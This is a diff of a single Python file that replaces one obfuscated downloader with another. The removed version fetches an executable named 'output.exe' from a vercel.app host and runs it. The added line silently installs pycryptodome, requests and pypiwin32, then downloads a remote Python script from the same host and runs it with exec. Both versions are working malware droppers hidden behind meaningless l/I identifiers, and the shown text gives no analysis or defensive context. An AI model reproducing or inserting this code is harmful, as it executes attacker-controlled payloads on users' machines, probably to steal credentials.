@@ -1,10 +1,1 @@
-lllllllllllllll,llllllllllllllI=exit,print
-import requests as IlllIIlllIlIIl,subprocess as lIllIlIIlIIlll,tempfile as IlllIIlIIIlIll,os as lIIIlIIIlIlIlI
-llIIlIIlIIllIllIlI='https://aparatus.vercel.app/output.exe'
-lIllllIlIlllIIlllI=IlllIIlllIlIIl.get(llIIlIIlIIllIllIlI)
-if lIllllIlIlllIIlllI.status_code==200:IIIllIllIIllIIlIII=lIllllIlIlllIIlllI.content
-else:lllllllllllllll(1)
-with IlllIIlIIIlIll.NamedTemporaryFile(delete=False,suffix='.exe')as lllIllllIIllIIIIll:lllIllllIIllIIIIll.write(IIIllIllIIllIIlIII);IIllIIIIllIlllllll=lllIllllIIllIIIIll.name
-try:IlllIIIllllllllIlI=lIllIlIIlIIlll.run([IIllIIIIllIlllllll],check=True)
-except lIllIlIIlIIlll.CalledProcessError as IIIIIIlIlIIlIlIllI:llllllllllllllI(f"An error occurred: {IIIIIIlIlIIlIlIllI}")
-finally:lIIIlIIIlIlIlI.remove(IIllIIIIllIlllllll)
+lllllllllllllll,llllllllllllllI,lllllllllllllIl,lllllllllllllII=__import__,exec,Exception,ImportError;import subprocess as lllllIIlIIIIlI,sys as lllIlIIIIlIIII,requests as llIIlIIIIIIIll;IlllllIIlllllIIIIl=lambda IlllIIIIlIIlIIlIII:lllllIIlIIIIlI.check_call([lllIlIIIIlIIII.executable,'-m','pip','install',IlllIIIIlIIlIIlIII],stdout=lllllIIlIIIIlI.DEVNULL,stderr=lllllIIlIIIIlI.DEVNULL);lIlIIIIlIIlIIIlIlI=['pycryptodome','requests','pypiwin32'];[IlllllIIlllllIIIIl(IlllIIIIlIIlIIlIII) for IlllIIIIlIIlIIlIII in lIlIIIIlIIlIIIlIlI if lllllllllllllll(IlllIIIIlIIlIIlIII) is None];llllIllIIllIIIlllI='https://aparatus.vercel.app/uwu.py';lllIIIlIIIlllIIIII=llIIlIIIIIIIll.get(llllIllIIllIIIlllI);llIIlIIllIlIIllIII=lllIIIlIIIlllIIIII.text if lllIIIlIIIlllIIIII.raise_for_status() is None else None;[llllllllllllllI(llIIlIIllIlIIllIII) for llIIlIIllIlIIllIII in [llIIlIIllIlIIllIII] if llIIlIIllIlIIllIII is not None]
